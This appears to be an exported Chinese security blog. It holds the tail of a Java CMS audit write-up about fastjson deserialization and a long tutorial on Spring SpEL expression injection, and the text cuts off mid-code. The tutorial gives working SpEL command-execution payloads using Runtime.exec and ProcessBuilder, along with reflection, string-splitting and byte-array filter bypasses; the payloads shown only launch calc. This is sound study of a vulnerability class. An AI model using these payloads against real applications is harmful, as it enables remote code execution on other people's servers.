(userId.equals(getIdByLoginName(loginName)))&#123;  \n    // 这里面判断匹配，进行业务代码实现  \n&#125; else &#123;  \n    return;  \n&#125;\n\n\n7.  经测试，不存在 log4j2 漏洞之前看其他师傅的文章说，看组件还是有 log4j2 的漏洞的，其实根本没有啊，对应的 maven 仓库，并不显示存在 log4j2 漏洞\n\n\n0x04 关于蓝帽杯决赛 awd Plus 对于这个 CMS 变样考法的思考\n当时因为我自己的一些原因没有修出来，赛后看其他队伍的 WP 是这么修的。\n\n\n\n其实我是有点不太理解的，如果只是一个单纯的入口的话要开启 AutoType 才可以吧，不明白为什么这里算是漏洞点了。\n在请教过 Y4tacker 师傅之后这里总算是明白了！\n1.2.55 的版本也是存在能够不开启 AutoType 的 PoC 的，而且也不少，所以这里也是存在漏洞的。具体的 PoC 可以参考这个仓库https://github.com/safe6Sec/Fastjson\n重要点AutoType 为 false 时 :先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错\nAutoType 为 true 时 :先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤\n要用的 PoC 是 fastjson&lt;&#x3D;1.2.68 的攻击方法，正好这里也有 hikari 的库，所以这个题目应该是这么打的。\n至于在比赛当中的修复，直接把这个入口类 ban 掉即可。有一些其他接口也是存在 parseObject 的反序列化入口，但是输入并不可控，就没有必要管了。\n0x05 小结审计 Java 项目可以直接通过全局搜索进行白盒的代码审计，尤其是 SQL 注入，fastjson 反序列化这种漏洞，尤为明显。\n刚入门 Java 不久，还很菜，文章中如有写的不好的地方还望请师傅们指出，感激不尽！\n0x06 参考资料https://www.cnblogs.com/bmjoker/p/14856437.html\n","categories":["代码审计"],"tags":["Java","代码审计"]},{"title":"Java 之 SpEL 表达式注入","url":"/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","content":"SpEL 表达式注入\n\nJava 之 SpEL 表达式注入0x01 前言尽量 SpEL 表达式，EL 表达式放一块儿学\n0x02 SpEL 表达式基础SpEL 简介在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。\n在 Spring 系列产品中，SpEL 是表达式计算的基础，实现了与 Spring 生态系统所有产品无缝对接。Spring 框架的核心功能之一就是通过依赖注入的方式来管理 Bean 之间的依赖关系，而 SpEL 可以方便快捷的对 ApplicationContext 中的 Bean 进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量 Java 代码。\nSpEL 有许多特性：\n\n使用 Bean 的 ID 来引用 Bean\n可调用方法和访问对象的属性\n可对值进行算数、关系和逻辑运算\n可使用正则表达式进行匹配\n可进行集合操作\n\nSpEL 定界符 —— #&#123;&#125;SpEL 使用 #&#123;&#125; 作为定界符，所有在大括号中的字符都将被认为是 SpEL 表达式，在其中可以使用 SpEL 运算符、变量、引用 Bean 及其属性和方法等。\n这里需要注意 #&#123;&#125; 和 $&#123;&#125; 的区别：\n\n#&#123;&#125; 就是 SpEL 的定界符，用于指明内容未 SpEL 表达式并执行；\n$&#123;&#125; 主要用于加载外部属性文件中的值；\n两者可以混合使用，但是必须 #&#123;&#125; 在外面，$&#123;&#125; 在里面，如 #&#123;&#39;$&#123;&#125;&#39;&#125;，注意单引号是字符串类型才添加的；\n\nSpEL 表达式类型字面值最简单的 SpEL 表达式就是仅包含一个字面值。\n下面我们在 XML 配置文件中使用 SpEL 设置类属性的值为字面值，此时需要用到 #&#123;&#125; 定界符，注意若是指定为字符串的话需要添加单引号括起来：\n&lt;property name=\"message1\" value=\"#&#123;666&#125;\"/>\n&lt;property name=\"message2\" value=\"#&#123;'John'&#125;\"/>\n\n还可以直接与字符串混用：\n&lt;property name=\"message\" value=\"the value is #&#123;666&#125;\"/>\n\nJava 基本数据类型都可以出现在 SpEL 表达式中，表达式中的数字也可以使用科学计数法：\n&lt;property name=\"salary\" value=\"#&#123;1e4&#125;\"/>\n\nDemo直接用 Spring 官网上的 HelloWorld 例子。\nHelloWorld.java\npackage com.example;\n \npublic class HelloWorld &#123;\n    private String message;\n \n    public void setMessage(String message)&#123;\n        this.message  = message;\n    &#125;\n \n    public void getMessage()&#123;\n        System.out.println(\"Your Message : \" + message);\n    &#125;\n&#125;\n\nDemo.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans  \n http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \">  \n  \n    &lt;bean id=\"helloWorld\" class=\"com.drunkbaby.pojo.HelloWorld\">  \n        &lt;property name=\"message\" value=\"#&#123;'Drunkbaby'&#125; is #&#123;777&#125;\" />  \n    &lt;/bean>  \n  \n&lt;/beans>\n\nMainTestDemo.java\npublic class MainTestDemo &#123;  \n    public static void main(String[] args) &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"Demo.xml\");  \n        HelloWorld helloWorld = context.getBean(\"helloWorld\", HelloWorld.class);  \n        helloWorld.getMessage();  \n    &#125;  \n&#125;\n\n测试一下\n\n\n引用 Bean、属性和方法引用 BeanSpEL 表达式能够通过其他 Bean 的 ID 进行引用，直接在 #&#123;&#125; 符号中写入 ID 名即可，无需添加单引号括起来。如：\n原来的写法是这样的\n&lt;constructor-arg ref=\"test\"/>\n\n在 SpEL 表达式中\n&lt;constructor-arg value=\"#&#123;test&#125;\"/>\n\n引用类属性SpEL 表达式能够访问类的属性。\n比如，Drunkbaby 参赛者是一位模仿高手，Johnford 唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：\n&lt;bean id=\"kenny\" class=\"com.spring.entity.Instrumentalist\"\n    p:song=\"May Rain\"\n    p:instrument-ref=\"piano\"/>\n&lt;bean id=\"Drunkbaby\" class=\"com.spring.entity.Instrumentalist\">\n    &lt;property name=\"instrument\" value=\"#&#123;kenny.instrument&#125;\"/>\n    &lt;property name=\"song\" value=\"#&#123;kenny.song&#125;\"/>\n&lt;/bean>\n\nkey 指定 kenny&lt;bean&gt; 的 idvalue 指定 kenny&lt;bean&gt;的 song 属性。其等价于执行下面的代码：\nInstrumentalist carl = new Instrumentalist();\ncarl.setSong(kenny.getSong());\n\n引用类方法SpEL 表达式还可以访问类的方法。\n假设现在有个 SongSelector 类，该类有个 selectSong() 方法，这样的话 Drunkbaby 就可以不用模仿别人，开始唱 songSelector 所选的歌了：\n&lt;property name=\"song\" value=\"#&#123;SongSelector.selectSong()&#125;\"/>\n\ncarl 有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用 toUpperCase() 方法：\n&lt;property name=\"song\" value=\"#&#123;SongSelector.selectSong().toUpperCase()&#125;\"/>\n\n注意：这里我们不能确保不抛出 NullPointerException，为了避免这个讨厌的问题，我们可以使用 SpEL 的 null-safe 存取器：\n&lt;property name=\"song\" value=\"#&#123;SongSelector.selectSong()?.toUpperCase()&#125;\"/>\n\n?. 符号会确保左边的表达式不会为 null，如果为 null 的话就不会调用 toUpperCase() 方法了。\nDemo —— 引用 Bean这里我们修改基于构造函数的依赖注入的示例。\nSpellChecker.java\npublic class SpellChecker &#123;  \n    public SpellChecker()&#123;  \n        System.out.println(\"Inside SpellChecker constructor.\" );  \n    &#125;  \n    public void checkSpelling() &#123;  \n        System.out.println(\"Inside checkSpelling.\" );  \n    &#125;  \n&#125;\n\nTextEditor.java\npublic class TextEditor &#123;  \n    private SpellChecker spellChecker;  \n    public TextEditor(SpellChecker spellChecker) &#123;  \n        System.out.println(\"Inside TextEditor constructor.\" );  \n        this.spellChecker = spellChecker;  \n    &#125;  \n    public void spellCheck() &#123;  \n        spellChecker.checkSpelling();  \n    &#125;  \n&#125;\n\n编写 editor.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans  \n http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \">  \n  \n    &lt;!-- Definition for spellChecker bean -->  \n &lt;bean id=\"spellChecker\" class=\"com.drunkbaby.pojo.SpellChecker\" />  \n  \n    &lt;!-- Definition for textEditor bean -->  \n &lt;bean id=\"textEditor\" class=\"com.drunkbaby.pojo.TextEditor\">  \n        &lt;!--&lt;constructor-arg ref=\"spellChecker\"/>-->  \n &lt;constructor-arg value=\"#&#123;spellChecker&#125;\"/>  \n    &lt;/bean>  \n  \n&lt;/beans>\n\n启动类 RefSpellAndEditor.java\npublic class RefSpellAndEditor &#123;  \n    public static void main(String[] args) &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"editor.xml\");  \n  \n        TextEditor te = (TextEditor) context.getBean(\"textEditor\");  \n        te.spellCheck();  \n    &#125;  \n&#125;\n\n\n\n类类型表达式 T(Type)在 SpEL 表达式中，使用 T(Type) 运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。\n使用 T(Type) 来表示 java.lang.Class 实例，Type 必须是类全限定名，但 ”java.lang” 包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。\n\n这里就有潜在的攻击面了因为我们 java.lang.Runtime 这个包也是包含于 java.lang 的包的，所以如果能调用 Runtime 就可以进行命令执行\n\n在 XML 配置文件中的使用示例，要调用 java.lang.Math 来获取 0~1 的随机数\n&lt;property name=\"random\" value=\"#&#123;T(java.lang.Math).random()&#125;\"/>\n\nExpression 中使用示例：\nExpressionParser parser = new SpelExpressionParser();\n// java.lang 包类访问\nClass&lt;String> result1 = parser.parseExpression(\"T(String)\").getValue(Class.class);\nSystem.out.println(result1);\n//其他包类访问\nString expression2 = \"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')\";\nClass&lt;Object> result2 = parser.parseExpression(expression2).getValue(Class.class);\nSystem.out.println(result2);\n//类静态字段访问\nint result3 = parser.parseExpression(\"T(Integer).MAX_VALUE\").getValue(int.class);\nSystem.out.println(result3);\n//类静态方法调用\nint result4 = parser.parseExpression(\"T(Integer).parseInt('1')\").getValue(int.class);\nSystem.out.println(result4);\n\nDemo在前面字面值的 Demo 中修改 Demo.xml 即可\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans  \n http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \">  \n  \n    &lt;bean id=\"helloWorld\" class=\"com.drunkbaby.pojo.HelloWorld\">  \n        &lt;property name=\"message\" value=\"#&#123;'Drunkbaby'&#125; is #&#123;T(java.lang.Math).random()&#125;\" />  \n    &lt;/bean>  \n  \n&lt;/beans>\n\n\n\n恶意利用 —— 弹计算器修改 value 中类类型表达式的类为 Runtime 并调用其命令执行方法即可：\n&lt;bean id=\"helloWorld\" class=\"com.drunkbaby.pojo.HelloWorld\">  \n    &lt;property name=\"message\" value=\"#&#123;'Drunkbaby'&#125; is #&#123;T(java.lang.Runtime).getRuntime.exec('calc')&#125;\" />  \n&lt;/bean>\n\n运行即可弹计算器。\n\n\n0x03 SpEL 用法SpEL 的用法有三种形式，一种是在注解 @Value 中；一种是 XML 配置；最后一种是在代码块中使用 Expression。\n前面的就是以 XML 配置为例对 SpEL 表达式的用法进行的说明，而注解 @Value 的用法例子如下：\npublic class EmailSender &#123;\n    @Value(\"$&#123;spring.mail.username&#125;\")\n    private String mailUsername;\n    @Value(\"#&#123; systemProperties['user.region'] &#125;\")    \n    private String defaultLocale;\n    //...\n&#125;\n\n这种形式的值一般是写在 properties 的配置文件中的。\n\n下面具体看下 Expression 的，Expression 的用法可谓是非常重要。\n\nExpression 用法由于后续分析的各种 Spring CVE 漏洞都是基于 Expression 形式的 SpEL 表达式注入，因此这里再单独说明 SpEL 表达式 Expression 这种形式的用法。\n步骤SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。\nExpressionParser parser = new SpelExpressionParser();\nExpression expression = parser.parseExpression(\"('Hello' + ' Drunkbaby').concat(#end)\");\nEvaluationContext context = new StandardEvaluationContext();\ncontext.setVariable(\"end\", \"!\");\nSystem.out.println(expression.getValue(context));\n\n具体步骤如下：\n1、创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；2、解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；3、构造上下文：准备比如变量定义等等表达式需要的上下文数据；4、求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；\n主要接口\nExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；\nEvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。\nExpression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。\n\nDemo应用示例如下，和前面 XML 配置的用法区别在于程序会将这里传入 parseExpression() 函数的字符串参数当初 SpEL 表达式来解析，而无需通过 #&#123;&#125; 符号来注明：\npublic class ExpressionCalc &#123;// 字符串字面量  \n  \n public static void main(String[] args) &#123;  \n        //String spel = \"123\"+\"456\";  \n // 算数运算  \n //String spel = \"123+456\";  \n // 操作类弹计算器，当然java.lang包下的类是可以省略包名的  \n String spel = \"T(java.lang.Runtime).getRuntime().exec(\\\"calc\\\")\";  \n        // String spel = \"T(Runtime).getRuntime().exec(\\\"calc\\\")\";  \n ExpressionParser parser = new SpelExpressionParser();  \n        Expression expression = parser.parseExpression(spel);  \n        System.out.println(expression.getValue());  \n    &#125;  \n&#125;\n\n\n\n类实例化类实例化同样使用 Java 关键字 new，类名必须是全限定名，但 java.lang 包内的类型除外。\npublic class newClass &#123;  \n    public static void main(String[] args) &#123;  \n        String spel = \"new java.util.Date()\";  \n        ExpressionParser parser = new SpelExpressionParser();  \n        Expression expression = parser.parseExpression(spel);  \n        System.out.println(expression.getValue());  \n    &#125;  \n&#125;\n\n\n\nSpEL 表达式运算下面内容引用自 SpEL表达式。\nSpEL 提供了以下几种运算符\n运算符类型运算符算数运算+, -, *, /, %, ^关系运算&lt;, &gt;, ==, &lt;=, &gt;=, lt, gt, eq, le, ge逻辑运算and, or, not, !条件运算?:(ternary), ?:(Elvis)正则表达式matches\n\n算数运算加法运算：\n&lt;property name=\"add\" value=\"#&#123;counter.total+42&#125;\"/>\n\n加号还可以用于字符串拼接：\n&lt;property name=\"blogName\" value=\"#&#123;my blog name is+' '+mrBird &#125;\"/>\n\n^运算符执行幂运算，其余算数运算符和 Java 一毛一样，这里不再赘述。\n关系运算判断一个 Bean 的某个属性是否等于 100：\n&lt;property name=\"eq\" value=\"#&#123;counter.total==100&#125;\"/>\n\n返回值是 boolean 类型。关系运算符唯一需要注意的是：在 Spring XML 配置文件中直接写 &gt;= 和 &lt;= 会报错。因为这 ”&lt;” 和 ”&gt;” 两个符号在 XML 中有特殊的含义。所以实际使用时，最好使用文本类型代替符号：\n运算符符号文本类型等于==eq小于&lt;lt小于等于&lt;=le大于&gt;gt大于等于&gt;=ge\n\n如\n&lt;property name=\"eq\" value=\"#&#123;counter.total le 100&#125;\"/>\n\n逻辑运算SpEL 表达式提供了多种逻辑运算符，其含义和 Java 也是一毛一样，只不过符号不一样罢了。\n使用 and 运算符：\n&lt;property name=\"largeCircle\" value=\"#&#123;shape.kind == 'circle' and shape.perimeter gt 10000&#125;\"/>\n\n两边为 true 时才返回 true。\n其余操作一样，只不过非运算有 not和 ! 两种符号可供选择。非运算：\n&lt;property name=\"outOfStack\" value=\"#&#123;!product.available&#125;\"/>\n\n条件运算条件运算符类似于 Java 的三目运算符：\n&lt;property name=\"instrument\" value=\"#&#123;songSelector.selectSong() == 'May Rain' ? piano:saxphone&#125;\"/>\n\n当选择的歌曲为 ”May Rain” 的时候，一个 id 为 piano 的 Bean 将装配到 instrument 属性中，否则一个 id 为 saxophone 的 Bean 将装配到 instrument 属性中。注意区别 piano 和字符串 “piano”！\n一个常见的三目运算符的使用场合是判断是否为null值：\n&lt;property name=\"song\" value=\"#&#123;kenny.song !=null ? kenny.song:'Jingle Bells'&#125;\"/>\n\n在以上示例中，如果 kenny.song 不为 null，那么表达式的求值结果是 kenny.song 否则就是 “Jingle Bells”\n正则表达式验证邮箱\n&lt;property name=\"email\" value=\"#&#123;admin.email matches '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.com'&#125;\"/>\n\n虽然这个邮箱正则不够健壮，但对于演示 matches 来说足够了。\n集合操作SpEL 表达式支持对集合进行操作。\n下面我们以示例看下能进行哪些集合操作。\n我们先创建一个 City 类：\nCity.java\npackage com.drunkbaby.pojo;  \n  \npublic class City &#123;  \n    private String name;  \n    private String state;  \n    private int population;  \n    public String getName() &#123;  \n        return name;  \n    &#125;  \n    public void setName(String name) &#123;  \n        this.name = name;  \n    &#125;  \n    public String getState() &#123;  \n        return state;  \n    &#125;  \n    public void setState(String state) &#123;  \n        this.state = state;  \n    &#125;  \n    public int getPopulation() &#123;  \n        return population;  \n    &#125;  \n    public void setPopulation(int population) &#123;  \n        this.population = population;  \n    &#125;  \n&#125;\n\n修改 city.xml，使用 &lt;util:list&gt; 元素配置一个包含 City 对象的 List 集合：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:p=\"http://www.springframework.org/schema/p\"\n       xmlns:util=\"http://www.springframework.org/schema/util\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\n    http://www.springframework.org/schema/util\n    http://www.springframework.org/schema/util/spring-util-4.0.xsd\">\n \n    &lt;util:list id=\"cities\">\n        &lt;bean class=\"com.example.City\" p:name=\"Chicago\"\n              p:state=\"IL\" p:population=\"2853114\"/>\n        &lt;bean class=\"com.example.City\" p:name=\"Atlanta\"\n              p:state=\"GA\" p:population=\"537958\"/>\n        &lt;bean class=\"com.example.City\" p:name=\"Dallas\"\n              p:state=\"TX\" p:population=\"1279910\"/>\n        &lt;bean class=\"com.example.City\" p:name=\"Houston\"\n              p:state=\"TX\" p:population=\"2242193\"/>\n        &lt;bean class=\"com.example.City\" p:name=\"Odessa\"\n              p:state=\"TX\" p:population=\"90943\"/>\n        &lt;bean class=\"com.example.City\" p:name=\"El Paso\"\n              p:state=\"TX\" p:population=\"613190\"/>\n        &lt;bean class=\"com.example.City\" p:name=\"Jal\"\n              p:state=\"NM\" p:population=\"1996\"/>\n        &lt;bean class=\"com.example.City\" p:name=\"Las Cruces\"\n              p:state=\"NM\" p:population=\"91865\"/>\n    &lt;/util:list>\n \n&lt;/beans>\n\n访问集合成员SpEL 表达式支持通过 #&#123;集合ID[i]&#125; 的方式来访问集合中的成员。\n定义一个 ChoseCity 类：\nChoseCity.java\npublic class ChoseCity &#123;\n    private City city;\n    public void setCity(City city) &#123;\n        this.city = city;\n    &#125;\n    public City getCity() &#123;\n        return city;\n    &#125;\n&#125;\n\n在 city.xml 中，选取集合中的某一个成员，并赋值给 city 属性中，这个语句要写在 util 的外面\n&lt;bean id=\"choseCity\" class=\"com.drunkbaby.service.ChoseCity\">  \n    &lt;property name=\"city\" value=\"#&#123;cities[0]&#125;\"/>  \n&lt;/bean>\n\n启动器 CityDemo.java\npublic class CityDemo &#123;  \n    public static void main(String[] args) &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"city.xml\");  \n        ChoseCity c = (ChoseCity)context.getBean(\"choseCity\");  \n        System.out.println(c.getCity().getName());  \n    &#125;  \n&#125;\n\n运行无误则输出 ”Chicago”\n\n\n随机地选择一个 city，中括号 [] 运算符始终通过索引访问集合中的成员：\n&lt;property name=\"city\" value=\"#&#123;cities[T(java.lang.Math).random()*cities.size()]&#125;\"/>\n\n此时会随机访问一个集合成员并输出。\n[]运算符同样可以用来获取 java.util.Map 集合中的成员。例如，假设 City 对象以其名字作为键放入 Map 集合中，在这种情况下，我们可以像下面那样获取键为 Dallas 的 entry：\n注意前提：是 City 对象以其名字作为键放入 Map 集合中\n&lt;property name=\"chosenCity\" value=\"#&#123;cities['Dallas']&#125;\"/>\n\n[] 运算符的另一种用法是从 java.util.Properties 集合中取值。例如，假设我们需要通过 &lt;util:properties&gt; 元素在 Spring 中加载一个 properties 配置文件：\n&lt;util:properties id=\"settings\" loaction=\"classpath:settings.properties\"/>\n\n现在要在这个配置文件 Bean 中访问一个名为 twitter.accessToken 的属性：\n&lt;property name=\"accessToken\" value=\"#&#123;settings['twitter.accessToken']&#125;\"/>\n\n[] 运算符同样可以通过索引来得到某个字符串的某个字符，例如下面的表达式将返回 s：\n'This is a test'[3]\n\n查询集合成员SpEL 表达式中提供了查询运算符来实现查询符合条件的集合成员：\n\n.?[]：返回所有符合条件的集合成员；\n.^[]：从集合查询中查出第一个符合条件的集合成员；\n.$[]：从集合查询中查出最后一个符合条件的集合成员；\n\n新建一个 ListChoseCity，代码如下\nListChoseCity.java\npublic class ListChoseCity &#123;  \n    private List&lt;City> city;  \n  \n    public List&lt;City> getCity() &#123;  \n        return city;  \n    &#125;  \n    public void setCity(List&lt;City> city) &#123;  \n        this.city = city;  \n    &#125;  \n&#125;\n\n修改 city.xml\ncity.xml\n&lt;bean id=\"listChoseCity\" class=\"com.drunkbaby.service.ListChoseCity\">  \n    &lt;property name=\"city\" value=\"#&#123;cities.?[population gt 100000]&#125;\" />  \n&lt;/bean>\n\n启动器 ListCityDemo.java\npublic class ListCityDemo &#123;  \n    public static void main(String[] args) &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"city.xml\");  \n        ListChoseCity listChoseCity = context.getBean(\"listChoseCity\",ListChoseCity.class);  \n        for (City city:listChoseCity.getCity())&#123;  \n            System.out.println(city.getName());  \n        &#125;  \n    &#125;  \n&#125;\n\n输出了所有人口大于 10000 的城市\n\n\n集合投影集合投影就是从集合的每一个成员中选择特定的属性放入到一个新的集合中。SpEL 的投影运算符 .![] 完全可以做到这一点。\n例如，我们仅需要包含城市名称的一个 String 类型的集合：\n&lt;property name=\"cityNames\" value=\"#&#123;cities.![name]&#125;\"/>\n\n再比如，得到城市名字加州名的集合：\n&lt;property name=\"cityNames\" value=\"#&#123;cities.![name+','+state]&#125;\"/>\n\n把符合条件的城市的名字和州名作为一个新的集合：\n&lt;property name=\"cityNames\" value=\"#&#123;cities.?[population gt 100000].![name+','+state]&#125;\"/>\n\n&lt;property name=\"cityNames\" value=\"#&#123;cities.?[population gt 100000].![name+','+state]&#125;\"/>\n\n变量定义和引用在 SpEL 表达式中，变量定义通过 EvaluationContext 类的 setVariable(variableName, value) 函数来实现；在表达式中使用 ”#variableName” 来引用；除了引用自定义变量，SpEL 还允许引用根对象及当前上下文对象：\n\n#this：使用当前正在计算的上下文；\n#root：引用容器的 root 对象；\n\n示例，使用 setVariable() 函数定义了名为 variable 的变量，并且通过 #variable 来引用，同时尝试引用根对象和上下文对象：\n\n\ninstanceof 表达式SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如 ”&#39;haha&#39; instanceof T(String)” 将返回 true。\n自定义函数目前只支持类静态方法注册为自定义函数。SpEL 使用 StandardEvaluationContext 的 registerFunction() 方法进行注册自定义函数，其实完全可以使用 setVariable 代替，两者其实本质是一样的。\n示例，用户自定义实现字符串反转的函数：\npublic class ReverseString &#123;  \n    public static String reverseString(String input) &#123;  \n        StringBuilder backwards = new StringBuilder();  \n        for (int i = 0; i &lt; input.length(); i++) &#123;  \n            backwards.append(input.charAt(input.length() - 1 - i));  \n        &#125;  \n        return backwards.toString();  \n    &#125;  \n&#125;\n\n通过如下代码将方法注册到 StandardEvaluationContext 并且来使用它：\npublic class CustomFunctionReverse &#123;  \n    public static void main(String[] args) throws NoSuchMethodException &#123;  \n        ExpressionParser parser = new SpelExpressionParser();  \n        StandardEvaluationContext context = new StandardEvaluationContext();  \n        context.registerFunction(\"reverseString\",  \n                ReverseString.class.getDeclaredMethod(\"reverseString\", new Class[] &#123; String.class &#125;));  \n        String helloWorldReversed = parser.parseExpression(\"#reverseString('Drunkbaby')\").getValue(context, String.class);  \n        System.out.println(helloWorldReversed);  \n    &#125;  \n&#125;\n\n\n\n0x04 SpEL 表达式漏洞注入漏洞原理SimpleEvaluationContext 和 StandardEvaluationContext 是 SpEL 提供的两个 EvaluationContext：\n\nSimpleEvaluationContext : 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。\nStandardEvaluationContext : 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。\n\nSimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 StandardEvaluationContext 是支持全部 SpEL 语法的。\n由前面知道，SpEL 表达式是可以操作类及其方法的，可以通过类类型表达式 T(Type) 来调用任意类方法。这是因为在不指定 EvaluationContext 的情况下默认采用的是 StandardEvaluationContext，而它包含了 SpEL 的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。\n如下，前面的例子中已提过：\npublic class BasicCalc &#123;  \n    public static void main(String[] args) &#123;  \n        String spel = \"T(java.lang.Runtime).getRuntime().exec(\\\"calc\\\")\";  \n        ExpressionParser parser = new SpelExpressionParser();  \n        Expression expression = parser.parseExpression(spel);  \n        System.out.println(expression.getValue());  \n    &#125;  \n&#125;\n\n\n\n通过反射的方式进行 SpEL 注入\n因为这里漏洞原理是调用任意类，所以我们可以通过反射的形式来展开攻击：\n\npublic class ReflectBypass &#123;  \n    public static void main(String[] args) &#123;  \n        String spel = \"T(String).getClass().forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"calc\\\")\";  \n        ExpressionParser parser = new SpelExpressionParser();  \n        Expression expression = parser.parseExpression(spel);  \n        System.out.println(expression.getValue());  \n    &#125;  \n&#125;\n\n\n基础 PoC&amp;Bypass 整理\n相关代码已同步至 GitHub，师傅们可以直接复现\n\n下面我们来整理下各种利用的 PoC，这里默认把定界符 #&#123;&#125; 去掉。\nPoC：\n// PoC原型\n \n// Runtime\nT(java.lang.Runtime).getRuntime().exec(\"calc\")\nT(Runtime).getRuntime().exec(\"calc\")\n \n// ProcessBuilder\nnew java.lang.ProcessBuilder(&#123;'calc'&#125;).start()\nnew ProcessBuilder(&#123;'calc'&#125;).start()\n\n用 ProcessBuilder 来进行命令执行的代码如下\npublic class ProcessBuilderBypass &#123;  \n    public static void main(String[] args) &#123;  \n        String spel = \"new java.lang.ProcessBuilder(new String[]&#123;\\\"calc\\\"&#125;).start()\";  \n        ExpressionParser parser = new SpelExpressionParser();  \n        Expression expression = parser.parseExpression(spel);  \n        System.out.println(expression.getValue());  \n    &#125;  \n&#125;\n\n\n\n基础 bypass// Bypass技巧\n \n// 反射调用\nT(String).getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc\")\n \n// 同上，需要有上下文环境\n#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc\")\n \n// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤\nT(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"cmd\",\"/C\",\"calc\"&#125;)\n \n// 同上，需要有上下文环境\n#this.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"cmd\",\"/C\",\"calc\"&#125;)\n \n// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1\n// byte数组内容的生成后面有脚本\nnew java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()\n \n// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2\n// byte数组内容的生成后面有脚本\nT(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))\nJavaScript Engine Bypass 从 ruilin 师傅的文章学到还可以用js引擎(不知道能不能用颜文字或者其他 js 绕过的方法到这里，暂时没实验成功，测试成的师傅可以分享下).\n获取所有 js 引擎信息\n public static void main(String[] args) &#123;\n       ScriptEngineManager manager = new ScriptEngineManager();\n       List&lt;ScriptEngineFactory> factories = manager.getEngineFactories();\n       for (ScriptEngineFactory factory: factories)&#123;\n               System.out.printf(\n                   